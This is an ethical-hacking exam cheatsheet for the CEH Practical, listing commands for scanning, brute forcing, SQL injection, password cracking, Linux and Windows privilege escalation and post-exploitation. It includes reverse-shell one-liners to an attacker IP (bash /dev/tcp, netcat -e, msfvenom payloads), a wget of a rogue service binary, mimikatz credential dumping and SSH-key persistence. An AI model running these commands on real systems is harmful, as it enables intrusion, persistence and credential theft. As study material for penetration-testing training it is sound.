
---

# 🛡️ **Comprehensive CEH Practical Exam Cheatsheet**

---

### 1. **🕵️‍♂️ Information Gathering**

#### 🔍 **Nmap (Network Scanning & Enumeration)**
   - **Common Flags**:
     - **-sC**: Default script scanning.
     - **-sV**: Service version detection.
     - **-A**: Enable OS detection, version detection, script scanning, and traceroute.
     - **-p**: Specify ports (e.g., `-p 80,443` or `-p-` for all ports).
     - **-O**: OS detection.
     - **-sT**: Full TCP connect scan.
     - **-sS**: Stealth SYN scan.
     - **-sN**: Null scan (no flags set, useful for bypassing certain firewalls).
     - **-Pn**: Disable host discovery.
     - **-vv**: Increase verbosity for detailed output.
     - **-oN**: Save output to a file in normal format.
     - **-T4**: Set timing template (T0 slow, T5 fast).

#### 🗂️ **Gobuster (Directory & File Brute-Forcing)**
   - **Basic Directory Fuzzing**:
     - `gobuster dir -u [URL] -w [WORDLIST]`
   - **File Extensions**:
     - `gobuster dir -u [URL] -w [WORDLIST] -x php,html`
   - **HTTPS Insecure**:
     - `gobuster dir -u https://[URL] -w [WORDLIST] -k`

#### 📜 **ffuf (Parameter & Fuzzing)**
   - **Basic Directory Fuzzing**:
     - `ffuf -w [WORDLIST] -u http://[TARGET]/FUZZ`
   - **Parameter Fuzzing**:
     - `ffuf -w [WORDLIST] -u http://[TARGET]?FUZZ=test`
   - **POST Data Fuzzing**:
     - `ffuf -w [WORDLIST] -X POST -d "username=FUZZ&password=test" -u http://[TARGET]/login`

#### 🌐 **Sublist3r (Subdomain Enumeration)**
   - **Basic Subdomain Enumeration**:
     - `sublist3r -d [DOMAIN]`
   - **Save Results to File**:
     - `sublist3r -d [DOMAIN] -o [OUTPUT_FILE]`
   - **Verbose Output**:
     - `sublist3r -v -d [DOMAIN]`

---

### 2. **🔓 Vulnerability Scanning & Exploitation**

#### 💻 **SQLMap (SQL Injection Automation)**
   - **Check Current Database User**:
     - `sqlmap -u [TARGET_URL] --current-user`
   - **Enumerate Databases**:
     - `sqlmap -u [TARGET_URL] --dbs`
   - **List Tables**:
     - `sqlmap -u [TARGET_URL] -D [DATABASE_NAME] --tables`
   - **Dump All Data from a Table**:
     - `sqlmap -u [TARGET_URL] -D [DATABASE_NAME] -T [TABLE_NAME] --dump`
   - **Execute OS Commands**:
     - `sqlmap -u [TARGET_URL] --os-shell`

#### 🔐 **Hydra (Brute Forcing)**
   - **SSH Brute Force**:
     - `hydra -l [USER] -P [WORDLIST] [TARGET_IP] ssh`
   - **HTTP POST Form Brute Force**:
     - `hydra -l [USER] -P [WORDLIST] [URL] http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid Login"`
     - **Example - Advanced HTTP POST Form Brute Force**:
     ```bash
     hydra -l zeeshan -P /usr/share/wordlists/rockyou.txt 10.10.56.169 -V http-form-post "/login:username=^USER^&password=^PASS^:F=incorrect"
     ```
     - **FTP Brute Forcing**:
     - `hydra -l [USER] -P [WORDLIST] [TARGET_IP] ftp`

#### 🔍 **strace (System Call Tracer)**
   - **Trace system calls of a process**:
     - `strace -p [PID]`
   - **Trace execution of a binary**:
     - `strace [COMMAND]`
   - **Trace file access and file descriptors**:
     - `strace -e trace=open [COMMAND]`

#### 📚 **ltrace (Library Call Tracer)**
   - **Trace library calls made by a process**:
     - `ltrace -p [PID]`
   - **Trace a program's library calls**:
     - `ltrace [COMMAND]`
   - **Trace specific function calls**:
     - `ltrace -e [FUNCTION] [COMMAND]`

---

### 3. **🔨 WordPress Security Scanning**

#### 📝 **WPScan (WordPress Security Scanner)**
   - **Basic Scan**:
     - `wpscan --url [TARGET_URL]`
   
   - **Enumerate Users (`-e u`)**:
     - `wpscan --url [TARGET_URL] -e u`
   
   - **Enumerate Plugins (`-e p`)**:
     - `wpscan --url [TARGET_URL] -e p`
   
   - **Full Enumeration**:
     - `wpscan --url [TARGET_URL] -e vp,vt,u,m,t,cb,dbe`

   - **Brute Force Attack on WordPress Login**:
     - **General Syntax**:
       - `wpscan --url [TARGET_URL] -U [USER_LIST] -P [PASSWORD_LIST] --password-attack wp-login`
     - **Example**:
       ```bash
       wpscan --url blog.thm -U kwheel,bjoel -P /usr/share/wordlists/rockyou.txt --password-attack wp-login
       ```

   - **Brute Force via XML-RPC**:
     - `wpscan --url [TARGET_URL] --password-attack xmlrpc`
   
   - **Use WPScan API for Vulnerability Data**:
     - `wpscan --api-token [API_KEY] --url [TARGET_URL]`

---

### 4. **🔑 Password Cracking**

#### 🔐 **John the Ripper (Password Cracking)**
   - **Basic Wordlist Cracking**:
     - `john --wordlist=[WORDLIST] [HASH_FILE]`
   - **SHA-512 Crypt Format**:
     - `john --format=sha512crypt --wordlist=[WORDLIST] [HASH_FILE]`
   - **NTLM Format Cracking**:
     - `john --format=NT --wordlist=[WORDLIST] [HASH_FILE]`

#### 🔥 **Hashcat (Advanced Hash Cracking)**
   - **MD5 Hash Cracking**:
     - `hashcat -m 0 [HASH_FILE] [WORDLIST]`
   - **WPA2 Cracking**:
     - `hashcat -m 2500 [CAPTURE_FILE] [WORDLIST]`

---

### 5. **👑 Privilege Escalation**

#### 🐧 **Linux Privilege Escalation**

1. **Check If You Can Run Commands as Root**:
   - `sudo -l`
   
2. **Check if `/etc/passwd` or `/etc/shadow` Files Are Readable/Writable**:
   - `ls -l /etc/passwd /etc/shadow`
   
3. **Find SUID or SGID Bit Set Files**:
   - `find / -type f -perm -04000 -ls 2>/dev/null`
   
   📥 [LinPEAS](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh) - *Linux Privilege Escalation Script*

4. **Find Files with Capabilities**:
   - `getcap -r / 2>/dev/null`
   
   📥 [LinEnum](https://github.com/rebootuser/LinEnum) - *Linux Privilege Escalation Enumeration Script*

5. **Append Reverse Shell in Cronjobs**:
   - `cat /etc/crontab`
   - **Add Reverse Shell**:
     - `bash -i >& /dev/tcp/<your_ip>/<port> 0>&1`
   
6. **Path Exploitation**: Exploit misconfigured paths.

7. **NFS Exploitation**: Look for NFS share misconfigurations.

---

#### 💻 **Windows Privilege Escalation**

1. **Run Tools for Privilege Escalation**:
   - 📥 [WinPEAS](https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe) - *Windows Privilege Escalation Script*
   - 📥 [PrivescCheck](https://github.com/itm4n/PrivescCheck) - *Privilege Escalation Enumeration Tool*
   - 📥 [WES-NG](https://github.com/bitsadmin/wesng) - *Windows Exploit Suggester*

2. **Check

 Files for Credentials**:
   - `C:\Unattend.xml`
   - `C:\Windows\Panther\Unattend.xml`
   - `C:\Windows\system32\sysprep.inf`
   - `C:\Windows\system32\sysprep\sysprep.xml`

3. **Check PowerShell History**:
   - `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

4. **Check Saved Credentials**:
   - `cmdkey /list`
   - `runas /savecred /user:admin cmd.exe`

5. **Check IIS Configuration**:
   - `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`

6. **Retrieve PuTTY Credentials**:
   - `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`

7. **Check Scheduled Tasks for Misconfigurations**:
   - `schtasks /query /tn vulntask /fo list /v`
   - **Exploit Scheduled Task**:
     - `echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\tasktorun.bat`
     - `schtasks /run /tn vulntask`

8. **AlwaysInstallElevated Exploit**:
   - `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
   - **Generate Reverse Shell**:
     - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`
     - `msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

9. **Service Configuration Issues**:
   - `sc qc ______` (check service details)
   - Check **BINARY_PATH_NAME** and **SERVICE_START_NAME**

10. **Insecure Service Permissions**:
    - `sc qc WindowsScheduler`
    - **Replace Executable**:
      - `icacls C:\PROGRA~2\SYSTEM~1\WService.exe`
      - `wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe`
      - `move WService.exe WService.exe.bkp`
      - `move rev-svc.exe WService.exe`

11. **Unquoted Service Paths**: Identify and exploit unquoted service paths.

12. **Insecure Service Permissions**: Check and exploit incorrect service permissions.

13. **Abusing Dangerous Privileges**: Focus on **SeImpersonatePrivilege** and others.

14. **Common Exploitable Privileges**: Found at [Priv2Admin](https://github.com/gtworek/Priv2Admin).

---

### 6. **🔧 Post-Exploitation**

#### 📡 **Netcat (Networking Tool & Reverse Shells)**
   - **Listen for Connection**:
     - `nc -lvnp [PORT]`
   - **Reverse Shell**:
     - `nc [ATTACKER_IP] [PORT] -e /bin/bash`

#### 💻 **Mimikatz (Credential Dumping on Windows)**
   - **Dump Windows Credentials**:
     - `mimikatz.exe sekurlsa::logonpasswords`

#### 🔐 **SSH Key Persistence**:
   - **Add SSH Key**:
     - `echo [YOUR_PUBLIC_KEY] >> ~/.ssh/authorized_keys`

---

### 7. **⚙️ Burp Suite**

Burp Suite is a powerful tool for web application security testing. Below are its main modules and common use cases:

#### **🌐 Proxy** 
   - **Usage**: Intercept traffic between your browser and the target server.
   - **Common Scenarios**:
     - Intercept and modify HTTP requests before sending them to the server.
     - Inspect responses for hidden fields or information leaks.

#### **📧 Repeater** 
   - **Usage**: Manually modify and resend individual requests.
   - **Common Scenarios**:
     - Test different payloads for SQLi, XSS, etc.
     - Alter POST data to observe changes in server behavior.

#### **🎯 Intruder** 
   - **Usage**: Automate customized attacks like fuzzing and brute-forcing.
   - **Common Attacks**:
     - **Sniper**: Single payload, single injection point.
     - **Battering Ram**: Same payload sent to multiple injection points.
     - **Pitchfork**: Multiple payloads sent simultaneously to multiple positions.
     - **Cluster Bomb**: Every combination of payloads sent to multiple injection points.

#### **🔍 Scanner**
   - **Usage**: Automated vulnerability scanning.
   - **Common Scenarios**:
     - Detect common web application vulnerabilities like XSS, SQLi, etc.

#### **📜 Decoder**
   - **Usage**: Encode and decode data in various formats.
   - **Common Formats**:
     - Base64, URL encoding, HTML encoding, etc.

---

### 8. **📊 Wireshark**

Wireshark is a widely-used network protocol analyzer that helps in deep packet inspection and network troubleshooting. Below are some popular filters and tips for packet analysis:

#### **📝 Popular Filters**
   - **Filter by IP Address**:
     - `ip.addr == 192.168.1.1`
   - **Filter by MAC Address**:
     - `eth.addr == aa:bb:cc:dd:ee:ff`
   - **HTTP Traffic**:
     - `http`
   - **Filter by Port**:
     - `tcp.port == 80` (HTTP), `udp.port == 53` (DNS)
   - **DNS Queries**:
     - `dns`
   - **Follow a TCP Stream**:
     - Right-click on a packet and select *Follow TCP Stream*.

#### **🔍 Packet Analysis Tips**
   - **Check TCP Flags**:
     - Look for SYN, ACK, and RST flags to analyze connections.
   - **Identify Retransmissions**:
     - Look for duplicate or out-of-order packets.
   - **Inspect Latency**:
     - Filter `icmp` packets to analyze round-trip time for ping requests.
   - **Find Passwords**:
     - Search in **HTTP** or **FTP** protocols if encryption is not used.

---

### 9. **⚙️ Miscellaneous Tools**

#### ⚙️ **Msfvenom (Payload Generation)**
   - **Windows Reverse Shell**:
     - `msfvenom -p windows/shell_reverse_tcp LHOST=[YOUR_IP] LPORT=[PORT] -f exe -o shell.exe`
   
   - **Linux Reverse Shell**:
     - `msfvenom -p linux/x64/shell_reverse_tcp LHOST=[YOUR_IP] LPORT=[PORT] -f elf -o shell.elf`

---

> **Enjoy your journey of mastering hacking!** 😎

> **Follow on Linkedin for more:https://www.linkedin.com/in/m-zeeshan-zafar-9205a1248/**
---
